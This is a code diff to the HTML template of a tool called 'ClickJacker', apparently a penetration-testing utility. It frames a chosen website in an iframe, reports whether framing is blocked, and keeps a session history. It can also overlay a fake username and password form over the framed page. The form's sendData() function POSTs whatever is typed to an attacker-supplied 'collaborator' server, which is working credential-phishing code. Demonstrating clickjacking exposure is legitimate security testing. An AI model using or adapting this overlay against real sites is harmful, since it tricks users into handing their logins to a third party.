@@ -4,67 +4,171 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="stylesheet" type="text/css" href="/static/index.css">
 	<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700"/>
-
 	<title>ClickJacker</title>
 
 	<script type="text/javascript">
-		function loadWebsite(){
-			document.getElementsByName("website")[0].src=document.getElementsByName("webInput")[0].value;
+		var overlayActive = false;
+
+		function setFrameStatus(state) {
+			var badge = document.getElementById("frame-status");
+			badge.className = "status-badge " + state;
+			badge.textContent = state === "framed" ? "Framed" : state === "blocked" ? "Blocked" : "Loading...";
 		}
 
-		function clickjackOverlay(){
+		function attachFrameListener() {
+			var iframe = document.getElementsByName("website")[0];
+			iframe.addEventListener("load", function() {
+				try {
+					var href = iframe.contentWindow.location.href;
+					// Readable href means either a same-origin page or a browser
+					// error/blocked page. Any about: URL (including Firefox's
+					// about:neterror) and Chrome's chrome-error: scheme both
+					// indicate the frame was denied.
+					if (!href ||
+						href === "about:blank" ||
+						href.startsWith("about:") ||
+						href.startsWith("chrome-error:") ||
+						href.startsWith("chrome://")) {
+						setFrameStatus("blocked");
+					} else {
+						setFrameStatus("framed");
+					}
+				} catch(e) {
+					// SecurityError: cross-origin page loaded successfully in iframe
+					setFrameStatus("framed");
+				}
+			});
+		}
 
-			var link = document.createElement('link');
-			link.setAttribute('rel', 'stylesheet');
-			link.setAttribute('href', '/static/clickjack.css');
+		function loadWebsite() {
+			var url = document.getElementsByName("webInput")[0].value.trim();
+			if (!url) return;
+			var iframe = document.getElementsByName("website")[0];
+			setFrameStatus("loading");
+			iframe.src = url;
+			addToHistory(url);
+		}
 
-			var form = document.createElement('div');
-			form.innerHTML= `<div id="overlay"><form id="signin_form" method="POST" action="javascript:sendData()">
-							<label>Username: </label><br>
-							<input name="username" id="username" type="username"></input><br>
+		function addToHistory(url) {
+			var list = document.getElementById("url-history");
+			var items = list.querySelectorAll("li");
+			for (var i = 0; i < items.length; i++) {
+				if (items[i].dataset.url === url) return;
+			}
+			var li = document.createElement("li");
+			li.dataset.url = url;
+			li.title = url;
 
-							<label>Password: </label><br>
-							<input name="password" id="password" type="password"></input><br>
-							<input type="submit" value="submit">
-							</form></div>
-		`;
+			var label = document.createElement("span");
+			label.className = "url-label";
+			label.textContent = url;
+
+			var btn = document.createElement("button");
+			btn.className = "url-load";
+			btn.textContent = "Load";
+			btn.onclick = (function(u) {
+				return function() {
+					document.getElementsByName("webInput")[0].value = u;
+					setFrameStatus("loading");
+					document.getElementsByName("website")[0].src = u;
+				};
+			})(url);
+
+			li.appendChild(label);
+			li.appendChild(btn);
+			list.prepend(li);
+		}
+
+		function clickjackOverlay() {
+			if (overlayActive) return;
+			overlayActive = true;
+
+			var link = document.createElement("link");
+			link.setAttribute("rel", "stylesheet");
+			link.setAttribute("href", "/static/clickjack.css");
+
+			var overlay = document.createElement("div");
+			overlay.id = "overlay";
+			overlay.innerHTML = `<form id="signin_form" method="POST" action="javascript:sendData()">
+				<label>Username:</label>
+				<input name="username" id="username" type="text">
+				<label>Password:</label>
+				<input name="password" id="password" type="password">
+				<input type="submit" value="Submit">
+			</form>`;
+
 			document.head.appendChild(link);
-			document.getElementById('wrapper').appendChild(form)
+			document.getElementById("wrapper").appendChild(overlay);
+
+			var resetBtn = document.getElementById("overlay-reset");
+			if (resetBtn) resetBtn.style.display = "inline-block";
+		}
+
+		function removeOverlay() {
+			var overlay = document.getElementById("overlay");
+			if (overlay) overlay.parentNode.removeChild(overlay);
+			overlayActive = false;
+			var resetBtn = document.getElementById("overlay-reset");
+			if (resetBtn) resetBtn.style.display = "none";
 		}
 
 		async function sendData() {
 			var signinForm = document.querySelector("#signin_form");
 			var formData = new FormData(signinForm);
-
 			try {
 				var collabServer = document.getElementsByName("collabInput")[0].value;
-				console.log(collabServer);
-				var response = await fetch(`${collabServer}`,{
+				var response = await fetch(collabServer, {
 					method: "POST",
 					body: formData,
 				});
 				console.log(await response.json());
-			} catch (e){
+			} catch (e) {
 				console.error(e);
 			}
-
 		}
 
+		document.addEventListener("DOMContentLoaded", function() {
+			attachFrameListener();
+
+			var initialSrc = document.getElementsByName("website")[0].src;
+			if (initialSrc && initialSrc !== "about:blank" && initialSrc !== window.location.href) {
+				addToHistory(initialSrc);
+			}
+
+			document.getElementsByName("webInput")[0].addEventListener("keydown", function(e) {
+				if (e.key === "Enter") loadWebsite();
+			});
+		});
 	</script>
 </head>
 <body>
-	<nav> 
-		Clickjacker
+	<nav>
+		{{if .Logo}}<img id="nav-logo" src="{{.Logo}}" alt="Logo">{{end}}
+		ClickJacker
 	</nav>
 
 	<div id="wrapper">
-		<div>
-			Insert web page to clickjack: <input name="webInput" value="{{.Site}}">  <button onclick="loadWebsite()">Submit</button><br>
-			Inser collaborator address:  <input name="collabInput" value="{{.Collab}}"> <button onclick="clickjackOverlay()">Clickjack </button>
+		<div id="controls">
+			<div class="control-row">
+				<span class="control-label">Web page to clickjack:</span>
+				<input name="webInput" value="{{.Site}}">
+				<button onclick="loadWebsite()">Submit</button>
+				<span id="frame-status" class="status-badge"></span>
+			</div>
+			<div class="control-row">
+				<span class="control-label">Collaborator address:</span>
+				<input name="collabInput" value="{{.Collab}}">
+				<button onclick="clickjackOverlay()">Clickjack</button>
+				<button id="overlay-reset" onclick="removeOverlay()" style="display:none;">Remove Overlay</button>
+			</div>
 		</div>
-	
+
+		<div id="history-panel">
+			<div id="history-title">Session History</div>
+			<ul id="url-history"></ul>
+		</div>
+
 		<iframe name="website" src="{{.Site}}"></iframe>
 	</div>
-
 </body>
 </html>
